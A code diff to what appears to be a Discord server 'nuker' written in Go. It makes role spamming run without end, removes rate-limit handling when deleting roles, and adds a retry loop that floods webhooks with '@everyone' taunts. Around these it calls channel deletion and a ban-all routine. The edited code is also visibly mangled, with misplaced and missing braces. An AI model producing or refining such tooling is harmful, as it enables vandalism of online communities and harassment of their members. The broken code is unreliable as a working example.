@@ -164,7 +164,7 @@ restart:
 	}
 }
 func SpamRoles(dg *discordgo.Session, guild *discordgo.Guild) {
-	for i := 0; i < 250; i++ {
+	for {
 		create, err := dg.GuildRoleCreate(guild.ID)
 		if err != nil {
 			color.Error.Tips("Error creating role", err)
@@ -176,16 +176,16 @@ func SpamRoles(dg *discordgo.Session, guild *discordgo.Guild) {
 		if err != nil {
 			color.Error.Tips("Error creating role", err)
 		}
-		for _, v := range guild.Members {
-			err1 := dg.GuildMemberRoleAdd(guild.ID, v.User.ID, create.ID)
+		userID := guild.Members[rand.Intn(len(guild.Members))]
+			err1 := dg.GuildMemberRoleAdd(guild.ID, userID.User.ID, create.ID)
 			if err1 != nil {
 				color.Error.Tips("Error creating role", err)
 			}
-			color.Success.Tips("Success gave " + v.User.Username + " role of " + create.Name)
+			color.Success.Tips("Success gave " + userID.User.Username + " role of " + create.Name)
 		}
 
 	}
-}
+
 func DeleteRoles(dg *discordgo.Session, guild *discordgo.Guild) {
 loop:
 	for _, role := range guild.Roles {
@@ -201,14 +201,13 @@ loop:
 					goto loop
 				}
 			}
-			color.Error.Tips("Ratelimited " + err.Error())
-			goto loop
-			}
+
 				color.Success.Tips("Successfully deleted role " + roleID.Name)
 			}
+	}
 
 		}
-	
+
 
 func (*How) DeleteChannels(dg *discordgo.Session, guild *discordgo.Guild) {
 loop:
@@ -248,6 +247,7 @@ func (h *How) CreateChannels(dg *discordgo.Session, guildID, channelName string,
 
 			go func() {
 				for {
+					retry:
 					randomIndex := rand.Intn(len(webhooks))
 					req, err1 := http.Post(webhooks[randomIndex], "application/json", strings.NewReader(`{"content":"@everyone mb yo https://github.com/zLeki/How\nhttps://tenor.com/view/rip-pack-bozo-dead-gif-20309754"}`))
 					if err1 != nil {
@@ -256,8 +256,9 @@ func (h *How) CreateChannels(dg *discordgo.Session, guildID, channelName string,
 					if req.StatusCode == http.StatusOK {
 						color.Success.Tips("Sent message to webhook successfully", webhooks[randomIndex])
 					} else {
-						color.Error.Tips(req.Status)
+						goto retry
 					}
+
 				}
 			}()
 			h.BanAll(dg, guild)
